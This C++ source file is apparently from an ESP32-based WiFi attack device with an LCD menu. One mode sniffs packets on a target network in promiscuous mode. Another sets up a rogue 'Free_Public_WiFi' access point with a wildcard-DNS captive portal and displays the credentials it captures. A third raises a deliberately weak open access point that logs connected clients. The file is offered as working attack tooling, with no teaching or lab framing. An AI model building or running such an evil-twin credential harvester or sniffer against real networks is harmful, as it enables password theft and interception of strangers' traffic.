#include "attack_modes.h"
#include "../output/lcd_handler.h"
#include "packet_analyzer.h"
#include "web_servers.h"

void enterPSMode() {
  if (selectedNetwork == -1) {
    lcd.clear();
    lcd.print("No network");
    lcd.setCursor(0, 1);
    lcd.print("selected!");
    delay(2000);
    showAttackMenu();
    return;
  }
  
  // Set up promiscuous mode for packet sniffing
  WiFiNetwork net = networks[selectedNetwork];
  parseMacAddress(net.bssid, targetBSSID);
  
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
  
  // Initialize monitoring
  packetCount = 0;
  lastPacketReset = millis();
  packetLogs.clear();
  httpCount = dnsCount = arpCount = tcpCount = udpCount = 0;
  
  currentState = PS_MODE;
  lcd.clear();
  lcd.print("PS Mode - Sniffing");
  lcd.setCursor(0, 1);
  lcd.print("Pkts: 0");
}

void enterMITMMode() {
  // Create a fake "Free WiFi" network
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  
  String evilSSID = "Free_Public_WiFi";
  if (!WiFi.softAP(evilSSID)) {
    lcd.clear();
    lcd.print("AP Setup Failed!");
    delay(2000);
    showAttackMenu();
    return;
  }
  
  // Set up DNS and web server for captive portal
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  setupMitmServer();
  
  mitmDnsServer.start(53, "*", apIP);
  mitmClientCount = 0;
  mitmCredentials.clear();
  mitmPage = 0;
  
  currentState = MITM_MODE;
  lcd.clear();
  lcd.print("MITM: " + evilSSID);
  lcd.setCursor(0, 1);
  lcd.print("Clients: 0");
}

void enterAPMode() {
  // Create a weak access point with WEP encryption (weak security)
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  
  // Create a weakly configured network
  String weakSSID = "Weak_Open_WiFi";
  if (!WiFi.softAP(weakSSID)) {
    lcd.clear();
    lcd.print("AP Setup Failed!");
    delay(2000);
    showAttackMenu();
    return;
  }
  
  // Set up web server for logging
  setupApServer();
  
  apClientCount = 0;
  apLogs.clear();
  connectedDevices.clear();
  apPage = 0;
  currentState = AP_MODE;
  lcd.clear();
  lcd.print("AP: " + weakSSID);
  lcd.setCursor(0, 1);
  lcd.print("Clients: 0");
}

void updatePSMode() {
  // Update packet count display every second
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 1000) {
    lastUpdate = millis();
    
    lcd.setCursor(6, 1);
    lcd.print(String(packetCount) + " ");
    
    // Show protocol breakdown occasionally
    static int displayMode = 0;
    if (millis() % 5000 < 1000) {
      lcd.clear();
      switch(displayMode) {
        case 0:
          lcd.print("HTTP: " + String(httpCount));
          lcd.setCursor(0, 1);
          lcd.print("DNS: " + String(dnsCount));
          break;
        case 1:
          lcd.print("TCP: " + String(tcpCount));
          lcd.setCursor(0, 1);
          lcd.print("UDP: " + String(udpCount));
          break;
        case 2:
          lcd.print("ARP: " + String(arpCount));
          lcd.setCursor(0, 1);
          lcd.print("Total: " + String(packetCount));
          break;
      }
      displayMode = (displayMode + 1) % 3;
    } else {
      lcd.setCursor(0, 0);
      lcd.print("PS Mode - Sniffing");
      lcd.setCursor(0, 1);
      lcd.print("Pkts: " + String(packetCount) + " ");
    }
  }
}

void updateMITMMode() {
  // Update client count display every 2 seconds
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 2000) {
    lastUpdate = millis();
    
    mitmClientCount = WiFi.softAPgetStationNum();
    
    if (mitmPage == 0) {
      // Show client count page
      lcd.clear();
      lcd.print("MITM: Free WiFi");
      lcd.setCursor(0, 1);
      lcd.print("Clients: " + String(mitmClientCount));
    } else {
      // Show credential logs page
      lcd.clear();
      lcd.print("Credential Logs");
      lcd.setCursor(0, 1);
      
      if (mitmCredentials.empty()) {
        lcd.print("No credentials");
      } else {
        String latestCred = mitmCredentials.back();
        int maxLen = min(16, (int)latestCred.length());
        lcd.print(latestCred.substring(0, maxLen));
      }
    }
  }
}

void updateAPMode() {
  // Update AP information every 2 seconds
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 2000) {
    lastUpdate = millis();
    
    int newClientCount = WiFi.softAPgetStationNum();
    if (newClientCount != apClientCount) {
      apClientCount = newClientCount;
      
      // Log connection changes
      String log = "Clients: " + String(apClientCount);
      apLogs.push_back(log);
      if (apLogs.size() > 20) {
        apLogs.erase(apLogs.begin());
      }
    }
    
    if (apPage == 0) {
      // Show client count page
      lcd.clear();
      lcd.print("AP: Weak WiFi");
      lcd.setCursor(0, 1);
      lcd.print("Clients: " + String(apClientCount));
    } else {
      // Show activity logs page
      lcd.clear();
      lcd.print("Activity Logs");
      lcd.setCursor(0, 1);
      
      if (apLogs.empty()) {
        lcd.print("No activity");
      } else {
        String latestLog = apLogs.back();
        int maxLen = min(16, (int)latestLog.length());
        lcd.print(latestLog.substring(0, maxLen));
      }
    }
  }
}
